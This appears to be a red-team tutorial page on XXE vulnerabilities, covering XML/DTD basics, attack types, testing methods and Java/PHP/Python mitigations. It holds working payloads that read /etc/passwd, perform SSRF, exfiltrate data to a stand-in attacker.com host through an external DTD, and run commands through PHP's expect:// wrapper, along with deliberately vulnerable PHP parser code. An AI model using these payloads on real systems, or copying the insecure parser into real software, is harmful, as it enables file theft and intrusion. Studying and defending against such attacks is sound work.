CWSE/XXE-Exploitaiton.content:
This note focuses on basic understanding of XEE Exploitation as a red teamer. For better understanding as a defender please refer to XEE Attack.
XML External Entity (XXE) Vulnerabilities

Introduction
What is XML?
XML (Extensible Markup Language) is a markup language used to define structured data readable by both humans and machines. Common uses include web services and data storage.
Example:
&lt;user&gt;
  &lt;name&gt;John&lt;/name&gt;
  &lt;surname&gt;Doe&lt;/surname&gt;
&lt;/user&gt;

What is a DTD?
A Document Type Definition (DTD) defines the structure and allowed elements in an XML document. It can be internal or external.
Example (external DTD):
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE library SYSTEM &quot;example.dtd&quot;&gt;
&lt;library&gt;
    &lt;book&gt;
        &lt;title&gt;The Great Gatsby&lt;/title&gt;
        &lt;author&gt;F. Scott Fitzgerald&lt;/author&gt;
        &lt;year&gt;1925&lt;/year&gt;
    &lt;/book&gt;
&lt;/library&gt;

What is an XXE Vulnerability?
An XXE (XML External Entity) vulnerability occurs when an XML parser processes external entities. Attackers can:


Read local files


Perform SSRF


Cause Denial of Service (DoS)


Potentially execute remote code


How it happens: The parser fetches external DTDs and entities, which can contain malicious payloads.

Real-World Examples


File uploads: .docx, .xlsx, .svg, etc.


SOAP APIs: XML-based communication endpoints


REST APIs: Accepting application/xml payloads


SAML Authentication: Poorly configured SAML implementations



Types of XXE Attacks
1. In-band XXE
Data is returned directly in the application’s response.
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
Mermaid diagram:
graph TD
Attacker[Send malicious XML] --&gt; Server[Processes XML]
Server --&gt; Response[Returns file content /etc/passwd]


2. Out-of-band (OOB) XXE
Data is sent to an attacker-controlled server when the response does not contain the data.
Example:
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
  &lt;!ENTITY % dtd SYSTEM &quot;attacker.com/evil.dtd&quot;&gt;
  %dtd;
]&gt;
&lt;foo&gt;&lt;/foo&gt;
evil.dtd:
&lt;!ENTITY % data &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#039;attacker.com/%xxe;&#039;&gt;&quot;&gt;
%data;
Diagram:
graph TD
Server[Processes XXE] --&gt; HTTP[Requests data to attacker.com]
Attacker[Receives exfiltrated data]


3. Blind XXE
No direct data return. Attacker infers information through errors or system behavior.
Example:
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % xxe SYSTEM &quot;file:///nonexistent/file&quot;&gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;

4. Remote Code Execution (RCE) via XXE
Example in PHP using expect:// wrapper:
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
PHP vulnerable code:
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#039;php://input&#039;);
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
echo &quot;Hello &quot; . $user;

Exploiting XXE to Retrieve Files
Basic File Retrieval
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
Diagram:
graph TD
Attacker[Send XML] --&gt; Server[Reads /etc/passwd]
Server --&gt; Response[Returns file content]

Windows Example:
&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;
Directory Listing
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot;&gt;

Exploiting XXE for SSRF
Basic SSRF Attack
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM &quot;internal-server.com/admin&quot;&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
Diagram:
graph TD
Attacker[Send XML] --&gt; Server[Server requests internal-server.com]
Server --&gt; Internal[Access internal server resources]

Out-of-Band SSRF
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY % internal_data SYSTEM &quot;http://internal-api/get_data&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;attacker.com/evil.dtd&quot;&gt;
    %dtd;
]&gt;
&lt;foo/&gt;
evil.dtd:
&lt;!ENTITY % send_data &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#039;attacker.com/%internal_data;&#039;&gt;&quot;&gt;
%send_data;

Finding and Testing for XXE
Identifying Entry Points


File uploads: .xml, .docx, .xlsx, .svg


API endpoints: application/xml POST requests


Request bodies containing XML



Manual Testing Techniques
Basic XXE Test
&lt;?xml version=&quot;1.0&quot; ?&gt;
	&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe &quot;XXE_TEST&quot;&gt;
]&gt;
&lt;user&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/user&gt;
Diagram:
graph TD
Send[Send XXE_TEST] --&gt; Server[Server processes entity]
Server --&gt; Response[Returns XXE_TEST]

File Retrieval Test
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;

Automated Tools


Burp Suite: Scanner, Repeater, Intruder


OWASP ZAP: Automated scanner


XXEinjector: XXE-specific tool


Payload Lists:


PayloadsAllTheThings - XXE Injection


PayloadBox - XXE Payload List



XXE Prevention Methods
Disable External Entity Processing
Java: XMLInputFactory
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
Java: DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(&quot;apache.org/xml/features/disallow-doctype-decl&quot;, true);
dbf.setFeature(&quot;xml.org/sax/features/external-general-entities&quot;, false);
dbf.setFeature(&quot;xml.org/sax/features/external-parameter-entities&quot;, false);
PHP
libxml_disable_entity_loader(true);
Python (lxml)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
tree = etree.parse(xml_file, parser)

Input Validation and Sanitization


Whitelist known good values


Remove potentially malicious characters or structures



Web Application Firewall (WAF)


Detect and block known XXE patterns


Should be used as an additional layer, not a standalone solution



Summary Diagram: XXE Attack Flow
graph TD
User[Send Malicious XML] --&gt; Server[Processes XML with XXE]
Server --&gt;|File Read| Response[Return Data]
Server --&gt;|SSRF| Internal[Access Internal Systems]
Attacker[Receives Data or Observes Effects]

